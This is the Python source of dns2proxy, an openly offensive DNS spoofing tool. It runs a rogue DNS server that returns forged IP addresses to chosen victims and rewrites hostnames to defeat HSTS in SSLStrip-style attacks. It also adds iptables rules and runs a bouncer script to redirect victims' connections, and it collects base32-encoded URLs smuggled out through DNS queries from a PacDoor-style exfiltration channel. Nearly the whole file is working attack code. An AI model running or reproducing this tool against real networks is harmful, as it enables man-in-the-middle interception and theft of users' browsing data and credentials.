#!/usr/bin/python
'''
dns2proxy for offensive cybersecurity v1.0


python dns2proxy.py -h for Usage.

Example:
python dns2proxy.py -i eth0 -u 192.168.1.101 -d 192.168.1.200

Example for no forwarding (only configured domain based queries and spoofed hosts):
  python2.6 dns2proxy.py -i eth0 -noforward

Example for no forwarding but add IPs
  python dns2proxy.py -i eth0 -I 192.168.1.101,90.1.1.1,155.54.1.1 -noforward

Author: Leonardo Nve ( leonardo.nve@gmail.com)
'''


import dns.message
import dns.rrset
import dns.resolver
import socket
import numbers
import threading
from struct import *
import datetime
import os
import signal
import errno
from time import sleep,time
import argparse
import json
import sys
from base64 import b32decode

consultas = {}
spoof = {}
dominios = {}
nospoof = []
nospoofto = []
victims = []

HTTPS_URLS_FILE = "https_urls_log.txt"
LOGREQFILE = "dnslog.txt"
LOGSNIFFFILE = "snifflog.txt"
LOGALERTFILE = "dnsalert.txt"
RESOLVCONF = "resolv.conf"

victim_file = "victims.cfg"
nospoof_file = "nospoof.cfg"
nospoofto_file = "nospoofto.cfg"
specific_file = "spoof.cfg"
dominios_file = "domains.cfg"
exfil_file = "exfil.cfg"

parser = argparse.ArgumentParser()
parser.add_argument("-N", "--noforward", help="DNS Fowarding OFF (default ON)", action="store_true")
parser.add_argument("-i", "--interface", help="Interface to use", default="eth0")
parser.add_argument("-u", "--ip1", help="First IP to add at the response", default=None)
parser.add_argument("-d", "--ip2", help="Second IP to add at the response", default=None)
parser.add_argument("-I", "--ips", help="List of IPs to add after ip1,ip2 separated with commas", default=None)
parser.add_argument("-S", "--silent", help="Silent mode", action="store_true")
parser.add_argument("-A", "--adminIP", help="Administrator IP for no filtering", default="192.168.0.1")
parser.add_argument("-t", "--hsts",    help="HSTS translate file", default="hsts.cfg")

args = parser.parse_args()

debug = not args.silent
dev = args.interface
adminip = args.adminIP
ip1 = args.ip1
ip2 = args.ip2
Forward = not args.noforward
translate_file = args.hsts
hsts_dictionary = {}
exfil = []

fake_ips = []
# List of of ips
if args.ips is not None:
    for ip in args.ips.split(","):
        fake_ips.append(ip)

Resolver = dns.resolver.Resolver()

######################
# GENERAL SECTION    #
######################


def save_req(lfile, str):
    f = open(lfile, "a")
    f.write(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + ' ' + str)
    f.close()


def SIGUSR1_handle(signalnum, frame):
    global noserv
    global Resolver
    noserv = 0
    DEBUGLOG('Reconfiguring....')
    process_files()
    Resolver.reset()
    Resolver.read_resolv_conf(RESOLVCONF)
    return


def process_files():
    global nospoof
    global spoof
    global nospoof_file
    global specific_file
    global dominios_file
    global dominios
    global nospoofto_file
    global translate_file
    global hsts_dictionary
    global exfil
    global victims

    for i in nospoof[:]:
        nospoof.remove(i)

    for i in nospoofto[:]:
        nospoofto.remove(i)

    for i in victims[:]:
        victims.remove(i)

    dominios.clear()
    spoof.clear()
    hsts_dictionary.clear()
    
    hsts_dictionary = json.loads(open(translate_file, "r").read())['general']
    for entry in hsts_dictionary:
        DEBUGLOG('Conversion: %s to %s'%(entry, hsts_dictionary[entry]))
    
    nsfile = open(nospoof_file, 'r')
    for line in nsfile:
        if line[0] == '#':
            continue
        h = line.split()
        if len(h) > 0:
            DEBUGLOG('Non spoofing ' + h[0])
            nospoof.append(h[0])

    nsfile.close()

    with open(exfil_file,'r') as nsfile2:
        for line in nsfile2:
            if line[0] == '#':
                continue
            h = line.split()
            if len(h) > 0:
                DEBUGLOG('Exfil domain ' + h[0])
                exfil.append(h[0])

    nsfile = open(victim_file, 'r')
    for line in nsfile:
        if line[0] == '#':
            continue
        h = line.split()
        if len(h) > 0:
            DEBUGLOG('Spoofing only to ' + h[0])
            victims.append(h[0])

    nsfile.close()

    nsfile = open(nospoofto_file, 'r')
    for line in nsfile:
        if line[0] == '#':
            continue
        h = line.split()
        if len(h) > 0:
            DEBUGLOG('Non spoofing to ' + h[0])
            nospoofto.append(h[0])

    nsfile.close()

    nsfile = open(specific_file, 'r')
    for line in nsfile:
        if line[0] == '#':
            continue
        h = line.split()
        if len(h) > 1:
            DEBUGLOG('Specific host spoofing ' + h[0] + ' with ' + h[1])
            spoof[h[0]] = h[1]

    nsfile.close()
    nsfile = open(dominios_file, 'r')
    for line in nsfile:
        if line[0] == '#':
            continue
        h = line.split()
        if len(h) > 1:
            DEBUGLOG('Specific domain IP ' + h[0] + ' with ' + h[1])
            dominios[h[0]] = h[1]

    nsfile.close()
    return


def DEBUGLOG(str,dtype = 'normal'):
    global debug
    if debug and dtype == 'normal':
        print str
    sys.stdout.flush()
    return

# External script to be executed when a host for a domain in domains.cfg is requested
def handler_msg(id):
    os.popen('./handler_msg.sh %s'%id)
    return

# Handler for the exfiltration of data, protocol from https://github.com/SafeBreach-Labs/pacdoor
# Host domain must be in the exfiltration config file exfil.cfg
channels = {}
def handler_exfiltration_domain(host, client):
    info = host.split(".")
    channel = info[1]
    if info[0].upper() == 'O':
        channels[channel] = {}
        channels[channel]["len"]=int(info[2][2:])
        channels[channel]["lastid"]=0
        channels[channel]["data"]={}
        channels[channel]["client"]=client
        DEBUGLOG("New channel %s added for client %s"%(channel,client))
        return '200.0.0.1'
    if info[0].upper() == 'W':
        if channel not in channels:
            return '200.0.0.6'
        DEBUGLOG("New data %s added for channel %s"%(info[2][1:],channel))
        channel_idx = int(info[2][1:])
        channels[channel]["data"][channel_idx] = info[3]
        if len(channels[channel]["data"]) == channels[channel]["len"]:
            data = ''
            for i in range(0,channels[channel]["len"]):
                data = data + channels[channel]["data"][i]
            decoded = b32decode(data.upper())
            DEBUGLOG("****             URL: %s"%decoded)
            with open(HTTPS_URLS_FILE,"a") as f:
                f.write("%s -> %s\n"%(channels[channel]["client"],decoded))
            # TODO: Administrar respuestas
            return '200.0.0.1'
    return '200.0.0.6'



######################
# SNIFFER SECTION    #
######################

class ThreadSniffer(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        #DEBUGLOG( self.getName(), " Sniffer Waiting connections....")
        go()

    #cap = pcapy.open_live(dev, 255, 1, 0)
    #cap.setfilter(bpffilter)

    #start sniffing packets
    # while True:
    #     try:
    #         (header, packet) = cap.next()
    #         parse_packet(packet)
    #     except:
    #         pass
    #         #DEBUGLOG( ('%s: captured %d bytes, truncated to %d bytes' %(datetime.datetime.now(), header.getlen(), header.getcaplen())))

#function to parse a packet
def parse_packet(pkt):
    eth_length = 14
    eth_protocol = 8
    global ip1
    global consultas
    global ip2
    from scapy.all import *
    
    ip = pkt.getlayer(IP)

    #TCP protocol
    if str(ip.proto) == '6':
    	tcp = pkt.getlayer(TCP)

        if consultas.has_key(ip.src):
            DEBUGLOG(' ==> Source Address : ' + str(ip.src) + ' *  Destination Address : ' + str(ip.dst))
            DEBUGLOG(' Source Port : ' + str(tcp.sport) + ' *  Dest Port : ' + str(tcp.dport))
            #            	print '>>>>  '+ip.src+' esta en la lista!!!!.....'
            comando = 'sh ./IPBouncer.sh %s %s %s %s' % (
                ip2, str(tcp.dport), consultas[str(ip.src)], str(tcp.dport))
            os.system(comando)
            #print '>>>> ' + comando
            comando = '/sbin/iptables -D INPUT -p tcp -d %s --dport %s -s %s --sport %s --j REJECT --reject-with tcp-reset' % (
                ip1, str(tcp.dport), str(ip.src), str(tcp.sport))
            os.system(comando)
            comando = '/sbin/iptables -A INPUT -p tcp -d %s --dport %s -s %s --sport %s --j REJECT --reject-with tcp-reset' % (
                ip1, str(tcp.dport), str(ip.src), str(tcp.sport))
            os.system(comando)
            #print '>>>> ' + comando

    #UDP packets
    elif str(ip.proto) == '17':
    	return
        #u = iph_length + eth_length
        #udph_length = 8
        #udp_header = packet[u:u + 8]
        #now unpack them :)
        #udph = unpack('!HHHH', udp_header)
        #source_port = udph[0]
        #dest_port = udph[1]
        #length = udph[2]
        #checksum = udph[3]
        #DEBUGLOG('Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Length : ' + str(length) + ' Checksum : ' + str(checksum))
        #h_size = eth_length + iph_length + udph_length
        #data_size = len(packet) - h_size
        #get data from the packet
        #data = packet[h_size:]

def go():
    global ip1
    global dev
    from scapy.all import *

    bpffilter = "ip and dst host %s and not src host %s and !(tcp dst port 80 or tcp dst port 443) and (not host %s)" % (
        ip1, ip1, adminip)
    DEBUGLOG( "Starting sniffing in (%s = %s)...." % (dev, ip1))
    sniff(prn=parse_packet,store=0,filter=bpffilter)

######################
#  DNS SECTION       #
######################

def respuestas(name, type):
    global Resolver

    DEBUGLOG('Query = ' + name + ' ' + type)
    try:
        answers = Resolver.query(name, type)
    except Exception, e:
        DEBUGLOG('Exception...')
        return 0
    return answers


def requestHandler(address, message):
    resp = None
    dosleep = False
    qtime = time()
    seconds_betwen_ids  = 30
    try:
        message_id = ord(message[0]) * 256 + ord(message[1])
        DEBUGLOG('msg id = ' + str(message_id))
        if message_id in serving_ids:
            if (qtime - serving_ids[message_id]) < seconds_betwen_ids:
                DEBUGLOG('I am already serving this request.')
                return
        serving_ids[message_id] = qtime
        DEBUGLOG('Client IP: ' + address[0])
        prov_ip = address[0]
        try:
            msg = dns.message.from_wire(message)
            try:
                op = msg.opcode()
                if op == 0:
                    # standard and inverse query
                    qs = msg.question
                    if len(qs) > 0:
                        q = qs[0]
                        DEBUGLOG('request is ' + str(q))
                        save_req(LOGREQFILE, 'Client IP: ' + address[0] + '    request is    ' + str(q) + '\n')
                        if q.rdtype == dns.rdatatype.A:
                            DEBUGLOG('Doing the A query....')
                            resp, dosleep = std_A_qry(msg, prov_ip)
                        elif q.rdtype == dns.rdatatype.PTR:
                            #DEBUGLOG('Doing the PTR query....')
                            resp = std_PTR_qry(msg)
                        elif q.rdtype == dns.rdatatype.MX:
                            DEBUGLOG('Doing the MX query....')
                            resp = std_MX_qry(msg)
                        elif q.rdtype == dns.rdatatype.TXT:
                            #DEBUGLOG('Doing the TXT query....')
                            resp = std_TXT_qry(msg)
                        elif q.rdtype == dns.rdatatype.AAAA:
                            #DEBUGLOG('Doing the AAAA query....')
                            resp = std_AAAA_qry(msg)
                        else:
                            # not implemented
                            resp = make_response(qry=msg, RCODE=4)  # RCODE =  4    Not Implemented
                else:
                    # not implemented
                    resp = make_response(qry=msg, RCODE=4)  # RCODE =  4    Not Implemented

            except Exception, e:
                DEBUGLOG('got ' + repr(e))
                resp = make_response(qry=msg, RCODE=2)  # RCODE =  2    Server Error
                DEBUGLOG('resp = ' + repr(resp.to_wire()))
        except Exception, e:
            DEBUGLOG('got ' + repr(e))
            resp = make_response(id=message_id, RCODE=1)  # RCODE =  1    Format Error
            DEBUGLOG('resp = ' + repr(resp.to_wire()))
    except Exception, e:
        # message was crap, not even the ID
        DEBUGLOG('got ' + repr(e))

    if resp:
        DEBUGLOG("Sending response...")
        s.sendto(resp.to_wire(), address)
    if dosleep: sleep(1)  # Performance downgrade no tested jet


def std_PTR_qry(msg):
    qs = msg.question
    DEBUGLOG( str(len(qs)) + ' questions.')
    iparpa = qs[0].to_text().split(' ', 1)[0]
    DEBUGLOG('Host: ' + iparpa)
    resp = make_response(qry=msg)
    hosts = respuestas(iparpa[:-1], 'PTR')
    if isinstance(hosts, numbers.Integral):
        DEBUGLOG('No host....')
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
        return resp

    for host in hosts:
        DEBUGLOG('Adding ' + host.to_text())
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.PTR, host.to_text())
        resp.answer.append(rrset)

    return resp


def std_MX_qry(msg):
    qs = msg.question
    DEBUGLOG(str(len(qs)) + ' questions.')
    iparpa = qs[0].to_text().split(' ', 1)[0]
    DEBUGLOG('Host: ' + iparpa)
    resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
    return resp
    #Temporal disable MX responses
    resp = make_response(qry=msg)
    hosts = respuestas(iparpa[:-1], 'MX')
    if isinstance(hosts, numbers.Integral):
        DEBUGLOG('No host....')
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
        return resp

    for host in hosts:
        DEBUGLOG('Adding ' + host.to_text())
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.MX, host.to_text())
        resp.answer.append(rrset)

    return resp


def std_TXT_qry(msg):
    qs = msg.question
    print str(len(qs)) + ' questions.'
    iparpa = qs[0].to_text().split(' ', 1)[0]
    print 'Host: ' + iparpa
    resp = make_response(qry=msg)

    host = iparpa[:-1]
    punto = host.find(".")
    dominio = host[punto:]
    host = "."+host
    spfresponse = ''
    if (dominio in dominios) or (host in dominios):
        ttl = 1
        DEBUGLOG('Alert domain! (TXT) ID: ' + host)
        # Here the HANDLE!
        #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
        save_req(LOGALERTFILE, 'Alert domain! (TXT) ID: ' + host+ '\n')
        if host in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%host
        if dominio in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%dominio
        DEBUGLOG('Responding with SPF = ' + spfresponse)
        rrset = dns.rrset.from_text(iparpa, ttl, dns.rdataclass.IN, dns.rdatatype.TXT, spfresponse)
        resp.answer.append(rrset)
        return resp

    hosts = respuestas(iparpa[:-1], 'TXT')
    if isinstance(hosts, numbers.Integral):
        print 'No host....'
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3    NXDOMAIN
        return resp

    for host in hosts:
        print 'Adding ' + host.to_text()
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.TXT, host.to_text())
        resp.answer.append(rrset)

    return resp

def std_SPF_qry(msg):
    qs = msg.question
    print str(len(qs)) + ' questions.'
    iparpa = qs[0].to_text().split(' ', 1)[0]
    print 'Host: ' + iparpa
    resp = make_response(qry=msg)

    # host = iparpa[:-1]
    # punto = host.find(".")
    # dominio = host[punto:]
    # host = "."+host
    # if (dominio in dominios) or (host in dominios):
    #     ttl = 1
    #     DEBUGLOG('Alert domain! (TXT) ID: ' + host)
    #     # Here the HANDLE!
    #     #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
    #     save_req(LOGALERTFILE, 'Alert domain! (TXT) ID: ' + host+ '\n')
    #     if host in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%host
    #     if dominio in dominios: spfresponse = "v=spf1 a:mail%s/24 mx -all "%dominio
    #     DEBUGLOG('Responding with SPF = ' + spfresponse)
    #     rrset = dns.rrset.from_text(iparpa, ttl, dns.rdataclass.IN, dns.rdatatype.TXT, spfresponse)
    #     resp.answer.append(rrset)
    #     return resp


    hosts = respuestas(iparpa[:-1], 'SPF')
    if isinstance(hosts, numbers.Integral):
        print 'No host....'
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3    NXDOMAIN
        return resp

    for host in hosts:
        print 'Adding ' + host.to_text()
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.SPF, host.to_text())
        resp.answer.append(rrset)

    return resp

def std_AAAA_qry(msg):
    DEBUGLOG('Request AAAA disabled....')
    resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
    return resp
    #qs = msg.question
    # DEBUGLOG(str(len(qs)) + ' questions.')
    # iparpa = qs[0].to_text().split(' ', 1)[0]
    # DEBUGLOG('Host: ' + iparpa)
    # resp = make_response(qry=msg)
    # hosts = respuestas(iparpa[:-1], 'AAAA')
    #
    #
    # if isinstance(hosts, numbers.Integral):
    #     DEBUGLOG('No host....')
    #     resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
    #     return resp
    #
    # for host in hosts:
    #     DEBUGLOG('Adding ' + host.to_text())
    #     rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.AAAA, host.to_text())
    #     resp.answer.append(rrset)
    #
    # return resp

def std_A_qry(msg, prov_ip):
    global consultas
    global ip1
    global ip2
    global fake_ips

    dosleep = False
    qs = msg.question
    DEBUGLOG(str(len(qs)) + ' questions.')
    resp = make_response(qry=msg)
    ips = []
    for q in qs:
        qname = q.name.to_text()[:-1]
        DEBUGLOG('q name = ' + qname)

        host = qname.lower()

        dom1 = None

        punto1 = host.rfind(".")
        punto2 = host.rfind(".", 0, punto1-1)

        if punto1 > -1:
            dom1 = host[punto1:]

        if punto2 > -1:
            dominio = host[punto2:]
        else:
            dominio = "."+host

        # punto = host.find(".")
        # dominio = host[punto:]

        if dominio[1:] in exfil:
            respuesta = handler_exfiltration_domain(qname,prov_ip)
            if respuesta is not None:
                rrset = dns.rrset.from_text(q.name, 1, dns.rdataclass.IN, dns.rdatatype.A, respuesta)
                resp.answer.append(rrset)
                return resp, dosleep
        else:
            if ((dominio in dominios) or (dom1 in dominios)) and (qname.lower() not in spoof):
                ttl = 1
                id = host[:punto2]
                if dom1 in dominios:
                    id = host[:punto1]
                    dominio = dom1

                if not id == 'www':
                    DEBUGLOG('Alert domain! ID: ' + id)
                    # Here the HANDLE!
                    #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
                    handler_msg(qname)
                    save_req(LOGALERTFILE, 'Alert domain! ID: ' + id + '\n')
                DEBUGLOG('Responding with IP = ' + dominios[dominio])
                rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[dominio])
                resp.answer.append(rrset)
                return resp, dosleep

            if ".%s"%host in dominios:
                dominio = ".%s"%host
                ttl = 1
                DEBUGLOG('Responding with IP = ' + dominios[dominio])
                rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[dominio])
                resp.answer.append(rrset)
                return resp, dosleep
        
        #print dominio[1:]
        if qname.lower() not in spoof:
            # SSLSTRIP2 transformation
            host2 = qname.lower()

            #DEBUGLOG('Pre Cambio: %s'%host2)
            for entry in hsts_dictionary:
                host2 = host2.replace(hsts_dictionary[entry],entry)
                #DEBUGLOG('Cambio ( %s , %s ) : %s' % (entry, hsts_dictionary[entry], host2))

            #DEBUGLOG('SSLStrip transforming host: %s => %s ...' % (host, host2))
            ips = respuestas(host2, 'A')

            #print '>>> Victim: %s   Answer 0: %s'%(prov_ip,prov_resp)

            if isinstance(ips, numbers.Integral):
                DEBUGLOG('No host....')
                resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
                return resp, dosleep

            prov_resp = ips[0]
            consultas[prov_ip] = prov_resp

        ttl = 1
        if (host not in nospoof) and (prov_ip not in nospoofto) and (len(victims) == 0 or prov_ip in victims):
            if host in spoof:
                save_req(LOGREQFILE, '!!! Specific host (' + host + ') asked....\n')
                DEBUGLOG('!!! Specific host (' + host + ') asked....\n')
                rrset = dns.rrset.from_text(q.name, 1000, dns.rdataclass.IN, dns.rdatatype.A, spoof[host])
                resp.answer.append(rrset)
                for spoof_ip in spoof[host].split(","):
                    DEBUGLOG('Adding fake IP = ' + spoof_ip)
                    rrset = dns.rrset.from_text(q.name, 1000, dns.rdataclass.IN, dns.rdatatype.A, spoof_ip)
                    resp.answer.append(rrset)
                return resp, dosleep
            elif Forward:
                consultas[prov_ip] = prov_resp
                #print 'DEBUG: Adding consultas[%s]=%s'%(prov_ip,prov_resp)
                if ip1 is not None:
                    rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, ip1)
                    DEBUGLOG('Adding fake IP = ' + ip1)
                    resp.answer.append(rrset)
                if ip2 is not None:
                    #Sleep only when using global resquest matrix
                    dosleep = True
                    rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, ip2)
                    DEBUGLOG('Adding fake IP = ' + ip2)
                    resp.answer.append(rrset)
                if len(fake_ips)>0:
                    for fip in fake_ips:
                        rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, fip)
                        DEBUGLOG('Adding fake IP = ' + fip)
                        resp.answer.append(rrset)

        if not Forward and prov_ip not in nospoofto:
            if len(fake_ips) == 0:
                DEBUGLOG('No forwarding....')
                resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
            elif len(fake_ips) > 0:
                DEBUGLOG('No forwarding (but adding fake IPs)...')
                for fip in fake_ips:
                    rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, fip)
                    DEBUGLOG('Adding fake IP = ' + fip)
                    resp.answer.append(rrset)
            return resp, dosleep

        for realip in ips:
            DEBUGLOG('Adding real IP  = ' + realip.to_text())
            rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, realip.to_text())
            resp.answer.append(rrset)

    return resp, dosleep


# def std_A2_qry(msg):
# 	qs = msg.question
# 	DEBUGLOG(str(len(qs)) + ' questions.')
# 	iparpa = qs[0].to_text().split(' ',1)[0]
# 	print 'Host: '+ iparpa
# 	resp = make_response(qry=msg)
# 	rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.A, '4.4.45.4')
# 	resp.answer.append(rrset)
# 	return resp

def std_ASPOOF_qry(msg):
    global spoof
    qs = msg.question
    DEBUGLOG(str(len(qs)) + ' questions.')
    iparpa = qs[0].to_text().split(' ', 1)[0]
    DEBUGLOG('Host: ' + iparpa)
    resp = make_response(qry=msg)

    for q in qs:
        qname = q.name.to_text()[:-1]
        DEBUGLOG('q name = ' + qname) + ' to resolve ' + spoof[qname]
        # 	    rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.facebook.com.')
        # 		resp.answer.append(rrset)
        # 		rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.yahoo.com.')
        # 		resp.answer.append(rrset)
        # 		rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.tuenti.com.')
        # 		resp.answer.append(rrset)
        # 		rrset = dns.rrset.from_text(iparpa, 1000,dns.rdataclass.IN, dns.rdatatype.CNAME, 'www.twitter.com.')
        # 		resp.answer.append(rrset)
        rrset = dns.rrset.from_text(q.name, 1000, dns.rdataclass.IN, dns.rdatatype.A, spoof[qname])
        resp.answer.append(rrset)
        return resp


def make_response(qry=None, id=None, RCODE=0):
    if qry is None and id is None:
        raise Exception, 'bad use of make_response'
    if qry is None:
        resp = dns.message.Message(id)
        # QR = 1
        resp.flags |= dns.flags.QR
        if RCODE != 1:
            raise Exception, 'bad use of make_response'
    else:
        resp = dns.message.make_response(qry)
    resp.flags |= dns.flags.AA
    resp.flags |= dns.flags.RA
    resp.set_rcode(RCODE)
    return resp


process_files()
Resolver.reset()
Resolver.read_resolv_conf(RESOLVCONF)
signal.signal(signal.SIGUSR1, SIGUSR1_handle)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('', 53))
if Forward:
    DEBUGLOG('DNS Forwarding activado....')
else:
    DEBUGLOG('DNS Forwarding desactivado....')

DEBUGLOG('binded to UDP port 53.')
serving_ids = {}
noserv = True

if ip1 is not None and ip2 is not None and Forward:
    sniff = ThreadSniffer()
    sniff.start()

while True:
    if noserv:
        DEBUGLOG('waiting requests.')

    try:
        message, address = s.recvfrom(1024)
        noserv = True
    except socket.error as (code, msg):
        if code != errno.EINTR:
            raise

    if noserv:
        DEBUGLOG('serving a request.')
        requestHandler(address, message)
